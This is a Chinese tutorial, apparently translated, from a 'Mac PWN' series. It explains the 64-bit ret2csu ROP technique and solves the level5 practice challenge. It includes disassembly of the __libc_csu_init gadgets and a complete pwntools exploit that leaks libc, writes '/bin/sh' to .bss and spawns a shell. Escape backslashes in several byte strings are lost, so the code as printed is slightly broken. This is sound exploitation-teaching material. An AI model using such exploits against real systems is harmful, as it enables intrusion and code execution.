# Mac PWN 入门系列（七）Ret2Csu
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x0 PWN入门系列文章列表
[Mac 环境下 PWN入门系列（一）](https://www.anquanke.com/post/id/187922)
[Mac 环境下 PWN入门系列（二）](https://www.anquanke.com/post/id/189960)
[Mac 环境下 PWN入门系列（三）](https://www.anquanke.com/post/id/193115)
[Mac 环境下 PWN入门系列 (四）](https://www.anquanke.com/post/id/196095)
[Mac 环境下 PWN入门系列 (五)](https://www.anquanke.com/post/id/196624)
[Mac 环境下 PWN入门系列 (六)](https://www.anquanke.com/post/id/204755)
## 0x1 前言
网鼎杯白虎组那个of F
的题目出的很是时候，非常好的一道base64位ROP的题目，刚好用来当做本次64位ROP利用的典型例子，这里笔者就从基础知识到解决该题目，与各位小萌新一起分享下学习过程。
## 0x2 ret2csu
通过上一篇的学习，我们可以知道
64位程序的参数传递与32位有比较大的差别，前6个参数 由rdi rsi rdx rcx r8 r9
寄存器进行存放，在64位的程序中调用lib.so的时候会使用一个函数`__libc_csu_init`来进行初始化，通过这个函数里面的汇编片段，我们可以很巧妙控制到前3个参数和其他的寄存器，也能控制调用的函数地址，这个gadget
我们称之为64位的万能gadget，非常常用，学习ROP64位，是必不可少的一个环节。
上图是程序执行时加载流程。
下面我们一起来学习下吧。
题目获取:`git clone https://github.com/zhengmin1989/ROP_STEP_BY_STEP.git`
里面的level5 就是我们本次分析的题目。
这里我们先查看下汇编代码:
  1. AT&T 风格`objdump -- help`
          -d, --disassemble        Display assembler contents of executable sections
      -D, --disassemble-all    Display assembler contents of all sections
这里我们反汇编下执行部分的sections
`objdump -d ./level5`
  2. 8086风格这里可以直接上ida或者`objdump -d ./level5 -M intel`
64位ROP利用.assets/image-20200519095700969.png)
阅读的时候注意两者的源操作数与目的操作数的位置即可。
这里最适合阅读的话，推荐`odjdump -d ./level5 -M intel`
我们先简单分析下这个代码:
**ret2cus的灵魂之处体现在 gadget2 利用 gadget1 准备的数据来控制edi、rsi、rdx和控制跳转任意函数。**
这里是gadget1部分代码
      400606:       48 8b 5c 24 08          mov    rbx,QWORD PTR [rsp+0x8]
      40060b:       48 8b 6c 24 10          mov    rbp,QWORD PTR [rsp+0x10]
      400610:       4c 8b 64 24 18          mov    r12,QWORD PTR [rsp+0x18]
      400615:       4c 8b 6c 24 20          mov    r13,QWORD PTR [rsp+0x20]
      40061a:       4c 8b 74 24 28          mov    r14,QWORD PTR [rsp+0x28]
      40061f:       4c 8b 7c 24 30          mov    r15,QWORD PTR [rsp+0x30]
      400624:       48 83 c4 38             add    rsp,0x38
      400628:       c3                      ret
这里可以看到rbx、rbp、r12、r13、r14、r15 可以由栈上rsp偏移+0x8 、+0x10、+0x20、+0x28、+0x30来决定
最后rsp进行+0x38,然后ret,这里就很好形成了一个gagdet了,因为ret的作用就是 pop
rip,也就是说我们能控制gadget1结束后的rip。上面的代码是16进制的，可能不是很好理解,这里有个师傅的图画的相当形象(这里我做了一些修改,我们先从简单的利用开始学起。)
虽然这里我们可以完美控制了rbx等一些寄存器，但是我们参数寄存器是rdi、rsi、rdx、rcx、r8、r9，所以说gadget1好像没什么用？
这个时候我们就需要用到gadget2了,
      4005f0:       4c 89 fa                mov    rdx,r15
      4005f3:       4c 89 f6                mov    rsi,r14
      4005f6:       44 89 ef                mov    edi,r13d
      4005f9:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
可以看到我们的rdx、rsi、edi 可以由r15、r14、r13低32位来控制,call
由r12+rbx*8来控制,而这些值恰恰是我们gadget1可以控制的值。
但是这样我们仅仅只是利用gadget1 、 gadget2执行了一次控制,当call返回的时候，程序会继续向下执行，
如果此时
`cmp rbx,rbp; jne 4005f0`
如果此时rbx与rbp不相等，则jnp(not equal)则会进入这个循环
从而程序就卡在这里，ebx一直在+1，才退出，这里为了方便控制，我们可以根据gadget1来控制rbx==rbp，从而让程序继续向下走，回到了gadget1,在rsp+0x38处布置我们的返回地址，即可完成一次完成的ROP。
根据这个图(因为反编译的可能存在一些差异，我的程序可能跟这个图不太一样，但是整体逻辑是一样的)
这个图其实还是有点问题的,rsp应该向下8字节的位置,rsp指向的其实是第一个p64(0)(这里看作者右边那个图，感觉应该是未执行前画的堆栈图，那么结果就是对的)
下面我的分析是call gadget1进去gadget2来分析的。
rsp+8指向的rbx,… rsp+48指向的是r15,rsp+56(0x38),正好就是我们的返回地址,这个时候retn(pop
rip),执行我们的gadget2,gadget2向下执行的过程中，因为rsp没有改变，执行到`add
rsp,38h`,此时`rsp+0x38`,所以我们直接+0x38的位置,然后拼接我们的漏洞函数就可以了。
我们调整下结构就容易写一个csu的利用函数,方便我们在其他程序中快速利用
    def csu(rbx, rbp, r12, r13, r14, r15, last):
        # pop rbx,rbp,r12,r13,r14,r15
        # rbx should be 0,
        # rbp should be 1,enable not to jump
        # r12 should be the function we want to call
        # rdi=edi=r13d
        # rsi=r14
        # rdx=r15
        payload = p64(csu_end_addr) + p64(0) + p64(rbx) + p64(rbp) + p64(r12) + p64(
            r13) + p64(r14) + p64(r15)
        payload += p64(csu_front_addr)
        payload += 'A' * 0x38
        payload += p64(last)
        return payload
这里的注释写的很明白,
rdi由r13d来控制，rsi由r14来控制，rdx由r15来控制,这里的`csu_end_addr`是gadget1的开始地址,`csu_front_addr`是gadget2的开始地址。
也许有些小萌新还是对
        payload = p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
            r13) + p64(r14) + p64(r15)
这个构造感觉还是有点不懂，不过问题不大，我们用exp来解决这个题目，然后分析下，基本就能完整理解了。
首先还是套路三部曲:
**1.checksec**
没看栈保护、64位程序
**2.ida**
这里用了程序加载了 write,read,同时很明显read函数对buf处读取存在栈溢出，因为0x200>0x80
我们简单搜索下，发现这个题目没有后门函数，也没有`/bin/sh`字符串，这个套路其实我们之前也遇到过了。
就是通过栈溢出让write输出libc的基地址，然后用read函数往bss段里面写入`/bin/sh`然后在调用syscall
即可完成PWN的过程。
**3.编写exp**
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    
    from pwn import *
    # from libformatstr import *
    from LibcSearcher import LibcSearcher
    debug = True
    # 设置调试环境
    context(log_level = 'debug', arch = 'amd64', os = 'linux')
    # context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
    if debug:
        sh = process("./level5")
        elf=ELF('./level5')
    else:
        link = "x.x.x.x:xx"
        ip, port = map(lambda x:x.strip(), link.split(':'))
        sh = remote(ip, port)
        elf=ELF('./quantum_entanglement')
    write_got = elf.got['write']
    read_got = elf.got['read']
    main_addr = 0x400544
    bss_base = elf.bss()
    csu_end_addr= elf.search('x48x8bx5cx24x08').next()
    csu_front_addr = elf.search('x4cx89xfa').next()
    log.success("csu_end_addr => {}".format(hex(csu_end_addr)))
    log.success("csu_front_addr => {}".format(hex(csu_front_addr)))
    log.success("write_got => {}".format(hex(write_got)))
    log.success("read_got => {}".format(hex(read_got)))
    log.success("main_addr => {}".format(hex(main_addr)))
    log.success("bss_base => {}".format(hex(bss_base)))
    def csu(rbx, rbp, r12, r13, r14, r15, last):
        # pop rbx,rbp,r12,r13,r14,r15
        # rbx should be 0,
        # rbp should be 1,enable not to jump
        # r12 should be the function we want to call
        # rdi=edi=r13d
        # rsi=r14
        # rdx=r15
        payload = p64(csu_end_addr) + "A"*8 + p64(rbx) + p64(rbp) + p64(r12) + p64(
            r13) + p64(r14) + p64(r15)
        payload += p64(csu_front_addr)
        payload += 'A' * 0x38 # 这里+0x38是因为在gadget2中没有对rsp影响的操作，所以直接+0x38即可
        payload += p64(last)
        return payload
    sh.recvuntil('Hello, Worldn')
    payload1 = "A"*0x88 + csu(0, 1, write_got, 1, write_got, 8, main_addr)
    sh.sendline(payload1)
    write_addr = u64(sh.recv(8))
    log.success("sending payload1 ---> write_addr => {}".format(hex(write_addr)))
    libc = LibcSearcher('write',write_addr)
    libc_base_addr = write_addr - libc.dump("write")
    execve_addr = libc_base_addr + libc.dump("execve")
    system_addr = libc_base_addr + libc.dump("system")
    log.success("libc_base_addr => {}".format(hex(libc_base_addr)))
    log.success("execve_addr => {}".format(hex(execve_addr)))
    log.success("system_addr => {}".format(hex(system_addr)))
    # pause()
    #sh.recvuntil("Hello, Worldn")
    payload2 = "A"*0x88 + csu(0, 1, read_got, 0, bss_base, 0x100, main_addr)
    log.success("sending payload2 --->")
    sh.sendline(payload2)
    log.success("sending payload3 --->")
    payload3 = "/bin/shx00"
    payload3 += p64(system_addr)
    sh.sendline(payload3)
    log.success("sending payload4 --->")
    payload3 = "x00"*0x88 + csu(0, 1, bss_base+8, bss_base, 0, 0, main_addr)
    sh.sendline(payload3)
    sh.interactive()
这里我们以payload1 作为分析的样本
1.`payload1 = "x00"*0x88 + csu(0, 1, write_got, 1, write_got, 8, main_addr)`
可以看到这里
这个其实对应的调用是`write(1, writ_got_addr, 8)`
其他的点,建议自己跟一下,如果还不明白, 欢迎加入PWN萌新群，寻找大佬手把手教学。
UVE6OTE1NzMzMDY4 (Base64)
###  0x2.1 关于ret2csu的题外话
如果你看过ctfwiki的话，里面介绍了res2csu的攻击方式与本文是有些差异,主要是`__libc_csu_init`
这个函数由于是编译的原因(PS.我也是猜的),导致了不同,这里我们可以进行对比看看
这里我们可以重新选择编译下那个程序:
`gcc -g -fno-stack-protector -no-pie level5.c -o mylevel5`
左边是我们新编译的`mylevel5`,这个函数gadget1 与ctf wiki上面的分析是一样的,gadget2 与 level5 是一样的，很神奇吧。
右边是我们上面主要分析的流程的level5
**首先是gadget1:**
ctf wiki上面是直接选择了`pop rbx`开始,所以我的`rsp`就没必要+8了,所以
`payload = p64(csu_end_addr) + p64(0) +p64(rbx)`
我们需要去掉多出来的`p64(0)`
`payload = p64(csu_end_addr)+p64(rbx)`
**其次是gadget2:**
      4005d0:       4c 89 fa                mov    rdx,r15
      4005d3:       4c 89 f6                mov    rsi,r14
      4005d6:       44 89 ef                mov    edi,r13d
可以看到r15控制了rdx,r13d控制了edi,这个和我们上面分析相同，但是在ctfwiki上面的
可以看到r13控制的rdx,r15d控制了edi
    def csu(rbx, rbp, r12, r13, r14, r15, last):
        # pop rbx,rbp,r12,r13,r14,r15
        # rbx should be 0,
        # rbp should be 1,enable not to jump
        # r12 should be the function we want to call
        # rdi=edi=r15d
        # rsi=r14
        # rdx=r13
        payload = 'a' * 0x80 + fakeebp
        payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
            r13) + p64(r14) + p64(r15)
        payload += p64(csu_front_addr)
        payload += 'a' * 0x38
        payload += p64(last)
        sh.send(payload)